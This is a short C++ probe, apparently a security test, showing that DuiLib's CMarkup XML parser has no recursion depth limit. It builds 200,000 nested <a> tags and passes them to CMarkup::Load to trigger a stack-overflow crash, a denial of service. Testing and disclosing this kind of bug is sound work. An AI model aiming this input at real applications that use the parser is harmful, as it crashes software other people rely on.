// 探针：CMarkup 递归解析无深度限制 -> 栈溢出 (DoS)
// 预期：深层嵌套 XML 触发 stack overflow（ASan 报 stack-overflow）
#include "StdAfx.h"
#include <cstdio>
#include <string>
#include "Core/UIMarkup.h"

int main()
{
    // 构造 200000 层嵌套 <a> 标签，约 1.2MB，远小于 LoadFromFile 的 4MB 上限
    const int kDepth = 200000;
    std::string s;
    s.reserve(kDepth * 8);
    for (int i = 0; i < kDepth; ++i) s += "<a>";
    for (int i = 0; i < kDepth; ++i) s += "</a>";

    // 转成宽字符（UNICODE 构建下 CMarkup::Load 要 LPCTSTR）
    int n = ::MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), nullptr, 0);
    std::wstring w((size_t)n, L'\0');
    ::MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &w[0], n);

    printf("[probe] depth=%d bytes=%zu -> CMarkup::Load ...\n", kDepth, s.size());
    fflush(stdout);

    DuiLib::CMarkup xml;
    bool ok = xml.Load(w.c_str());
    printf("[probe] Load returned %d (expected depth limit rejection, not crash)\n", ok);
    return 0;
}
